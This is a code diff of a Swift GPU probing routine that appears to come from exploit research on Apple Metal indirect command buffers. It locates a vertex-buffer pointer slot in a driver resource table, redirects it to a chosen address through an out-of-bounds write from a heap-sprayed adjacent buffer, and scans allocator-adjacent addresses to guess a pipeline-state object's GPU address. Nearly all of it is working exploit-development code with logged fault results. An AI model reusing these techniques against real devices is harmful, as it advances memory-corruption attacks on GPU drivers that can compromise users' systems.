@@ -2916,93 +2916,113 @@ func runICBFieldProbe(log: FuzzLog, completion: @escaping () -> Void) {
         let baselineFault = probeExec()
         step("  result: \(baselineFault ? "FAULT — hi IS resource table (null VAs derefed)" : "OK — zeros safe")")
 
-        // Phase A: fill ALL of hi with sentinelBuf VA — does ICB execute clean?
-        step("── phase A: fill hi with sentVA=0x\(String(sentVA,radix:16)) ──")
-        fillHiSentinel(0, BUF_LEN)
-        let sentFullFault = probeExec()
-        step("  result: \(sentFullFault ? "FAULT — sentVA alone insufficient (PSO VA also needed)" : "SUCCESS ✓ — sentVA satisfies resource table")")
-
-        if !sentFullFault {
-            // Inverse binary search: start from all-filled, zero sections until fault returns
-            // The section that causes fault when zeroed = required field
-            step("── phase B: inverse binary search (zero sections, find required fields) ──")
-            // hi currently = all zeros (cleared after phase A)
+        // ── Phase A: single-slot probe — find which slot ONLY needs sentVA ─────────
+        // Test each 8B slot individually: hi = zeros everywhere except hi[slot] = sentVA
+        // If ICB DOESN'T fault → that slot is the vtxBuf binding (sentVA is the right value)
+        // If ICB still faults → either wrong slot or wrong value (PSO slot still null)
+        step("── phase A: single-slot sentVA probe (first 16 slots) ──")
+        var vtxSlot: Int? = nil
+        for slotIdx in 0..<16 {
+            let slotOff = slotIdx * 8
             clearHi(0, BUF_LEN)
-            // Re-fill all to start
-            fillHiSentinel(0, BUF_LEN)
+            fillHiVal(slotOff, slotOff + 8, val: sentVA)
+            let f = probeExec()
+            step("  slot[\(slotIdx)] +0x\(String(format:"%02x",slotOff)) = sentVA → \(f ? "FAULT" : "SUCCESS ✓")")
+            if !f { vtxSlot = slotOff; break }
+        }
+        clearHi(0, BUF_LEN)
 
-            var searchLo = 0
-            var searchHi2 = BUF_LEN
-            var iteration = 0
-            // narrow down: zero lower half, check if fault returns
-            while searchHi2 - searchLo > 8 {
-                iteration += 1
-                let mid = ((searchLo + searchHi2) / 2) & ~7
-                // Zero lower half, keep upper half filled
-                clearHi(searchLo, mid)
-                let faultAfterClear = probeExec()
-                step("  iter \(iteration): zero [0x\(String(format:"%x",searchLo))..0x\(String(format:"%x",mid))) → \(faultAfterClear ? "FAULT (required field in this range)" : "ok (not here)")")
-                if faultAfterClear {
-                    // Required field is in [searchLo, mid) — restore it, narrow
-                    fillHiSentinel(searchLo, mid)
-                    searchHi2 = mid
-                } else {
-                    // Required field is in [mid, searchHi2) — keep lower zeroed
-                    searchLo = mid
-                }
-                if iteration > 20 { step("  ✗ too many iterations"); break }
-            }
-
-            let reqOff = searchLo
-            step("── result ──")
-            step("✓ required resource table field @ hi[+0x\(String(format:"%x",reqOff))]")
-            step("  GPU VA of field: 0x\(String(hi.gpuAddress + UInt64(reqOff), radix:16))")
-            step("  field must contain: sentVA=0x\(String(sentVA,radix:16)) (vertex buffer binding)")
-
-            // Confirm: zero only that 8B slot → fault returns
+        if let vslot = vtxSlot {
+            step("✓ vtxBuf slot @ hi[+0x\(String(format:"%x",vslot))] — sentVA alone satisfies ICB")
+            // Replace with canaryVA via hi direct and via OOB
+            fillHiVal(vslot, vslot + 8, val: canaryVA)
+            let cFault = probeExec()
+            step("  canaryVA @ vtxSlot: \(cFault ? "FAULT ✓ GPU derefed our VA" : "ok")")
             clearHi(0, BUF_LEN)
-            fillHiSentinel(0, BUF_LEN)
-            clearHi(reqOff, reqOff + 8)
-            let confirmFault = probeExec()
-            step("  zero single slot +0x\(String(format:"%x",reqOff)): \(confirmFault ? "FAULT ✓ confirmed" : "ok (check range)")")
-
-            // Restore, replace that slot with canaryVA → controlled fault
-            fillHiSentinel(0, BUF_LEN)
-            fillHiVal(reqOff, reqOff + 8, val: canaryVA)
-            let canaryFault = probeExec()
-            step("  replace slot with canaryVA=0x\(String(canaryVA,radix:16)): \(canaryFault ? "FAULT ✓ GPU derefed our VA" : "ok")")
-
-            // Clean up
-            clearHi(0, BUF_LEN)
-
-            // OOB via lo adjacency at the confirmed offset
-            step("── OOB via lo adjacency at confirmed field ──")
-            fillHiSentinel(0, BUF_LEN)  // restore table to working state
             let p = lo.contents().assumingMemoryBound(to: UInt8.self)
-            for bi in 0..<8 { p[BUF_LEN + reqOff + bi] = UInt8((canaryVA >> (bi*8)) & 0xFF) }
-            step("  OOB[lo+0x\(String(format:"%x",BUF_LEN+reqOff))] ← canaryVA")
-            let oobFault = probeExec()
-            step("  OOB exec: \(oobFault ? "FAULT ✓ — OOB vtxBuf redirect confirmed" : "ok")")
+            fillHiVal(vslot, vslot + 8, val: sentVA)  // restore to working
+            for bi in 0..<8 { p[BUF_LEN + vslot + bi] = UInt8((canaryVA >> (bi*8)) & 0xFF) }
+            step("  OOB[lo+0x\(String(format:"%x",BUF_LEN+vslot))] ← canaryVA")
+            let oFault = probeExec()
+            step("  OOB exec: \(oFault ? "FAULT ✓ OOB-to-vtxBuf confirmed" : "ok")")
+            clearHi(0, BUF_LEN)
+        } else {
+            // sentVA at any single slot isn't enough — GPU needs PSO VA too
+            // Bound the PSO VA: allocate buffers around it in the NEXT probe step
+            step("  sentVA at single slot never sufficient → PSO VA required alongside")
+            step("── phase B: PSO VA bounding ──")
+            // We can't get PSO.gpuAddress from the API, but we can bracket it
+            // by noting what GPU VA the allocator gives for buffers allocated just before
+            // and just after makeRenderPipelineState. Those were:
+            //   sentinelBuf = 0x\(String(sentVA,radix:16)) (before PSO)
+            //   targetBuf   = 0x\(String(targetBuf.gpuAddress,radix:16)) (before PSO)
+            //   lo spray    = 0x\(String(lo.gpuAddress,radix:16)) (after PSO+ICB)
+            // So PSO VA is likely in (targetBuf.end .. lo.start) if same heap
+            let psoLo = targetBuf.gpuAddress + UInt64(BUF_LEN)
+            let psoHi2 = lo.gpuAddress
+            step("  PSO VA likely in [0x\(String(psoLo,radix:16))..0x\(String(psoHi2,radix:16))] if same heap")
+            step("  PSO heap range = 0x\(String(psoHi2 - psoLo,radix:16)) bytes")
+
+            // Try every page-aligned candidate VA in that range as slot 0 in hi
+            // paired with sentVA at every other slot — if ICB succeeds, that's the PSO VA
+            step("── phase C: PSO VA scan (page-aligned candidates, slot 0) ──")
+            var psoFound: UInt64? = nil
+            var psoSlot: Int? = nil
+            // Limit scan: try first 64 candidates (covers up to 256KB PSO range)
+            let candidateCount = min(64, Int((psoHi2 - psoLo) / 0x1000))
+            outerPSO: for psoCandidate in 0..<candidateCount {
+                let psoVA = psoLo + UInt64(psoCandidate) * 0x1000
+                for pSlot in 0..<16 {
+                    let pOff = pSlot * 8
+                    fillHiSentinel(0, BUF_LEN)          // all slots = sentVA
+                    fillHiVal(pOff, pOff + 8, val: psoVA) // override one slot with candidate PSO VA
+                    let f = probeExec()
+                    if !f {
+                        psoFound = psoVA
+                        psoSlot  = pOff
+                        step("✓ PSO VA=0x\(String(psoVA,radix:16)) @ slot[+0x\(String(format:"%x",pOff))] → ICB SUCCESS")
+                        break outerPSO
+                    }
+                }
+            }
             clearHi(0, BUF_LEN)
 
-        } else {
-            // sentVA alone not enough — need PSO VA too
-            // Dump hi[0..255] to find structure clues after full-fill+execute
-            step("── phase B: PSO VA needed — dumping hi after full-sentinel fill ──")
-            step("  (hi was filled with sentVA, ICB faulted — dump first 256 bytes of hi for structure)")
-            fillHiSentinel(0, BUF_LEN)
-            // re-execute to let driver write anything into hi during submission
-            let _ = probeExec()
-            step("── hi[0..255] after execute (driver may have written resource VAs) ──")
-            for row in 0..<16 {
-                let base = row * 16
-                var hexStr = ""
-                for i in 0..<16 { hexStr += String(format: "%02x ", q[base + i]) }
-                step("  [+0x\(String(format: "%03x", base))]: \(hexStr)")
+            if let pva = psoFound, let psl = psoSlot {
+                step("── PSO VA confirmed: 0x\(String(pva,radix:16)) @ hi[+0x\(String(format:"%x",psl))] ──")
+                step("  now find vtxBuf slot: fill table with psoVA, sweep other slots with sentVA")
+                var vtxSlot2: Int? = nil
+                for vSlot in 0..<16 {
+                    let vOff = vSlot * 8
+                    if vOff == psl { continue }
+                    clearHi(0, BUF_LEN)
+                    fillHiVal(psl, psl + 8, val: pva)    // PSO slot correct
+                    fillHiVal(vOff, vOff + 8, val: sentVA) // vtxBuf candidate
+                    let f = probeExec()
+                    step("  vtxSlot[\(vSlot)] +0x\(String(format:"%02x",vOff)) = sentVA → \(f ? "FAULT" : "SUCCESS ✓")")
+                    if !f { vtxSlot2 = vOff; break }
+                }
+                clearHi(0, BUF_LEN)
+                if let vs = vtxSlot2 {
+                    step("✓ vtxBuf slot @ hi[+0x\(String(format:"%x",vs))]")
+                    // Controlled redirect: PSO valid, vtxBuf = canaryVA
+                    fillHiVal(psl, psl + 8, val: pva)
+                    fillHiVal(vs, vs + 8, val: canaryVA)
+                    let cFault = probeExec()
+                    step("  PSO=valid vtxBuf=canaryVA: \(cFault ? "FAULT ✓ GPU read from our VA" : "ok")")
+                    clearHi(0, BUF_LEN)
+                }
+            } else {
+                step("  PSO VA not found in heap bracket — PSO uses separate allocator")
+                step("  → hi[0..127] raw dump (zeros baseline, nothing changed):")
+                for row in 0..<8 {
+                    let base = row * 16
+                    var h = ""
+                    for i in 0..<16 { h += String(format: "%02x ", q[base+i]) }
+                    step("  [+0x\(String(format:"%03x",base))]: \(h)")
+                }
+                step("  → resource table layout unknown via this approach")
+                step("  → next: try mach_vm_region scan to find PSO allocation")
             }
-            step("  → look for non-sentVA 8-byte patterns — those are PSO/other resource VAs")
-            step("  → next: fill hi with discovered PSO VA + sentVA at vtxBuf offset")
-            clearHi(0, BUF_LEN)
         }
 
         step("── ICB Field Probe complete ──────────────")
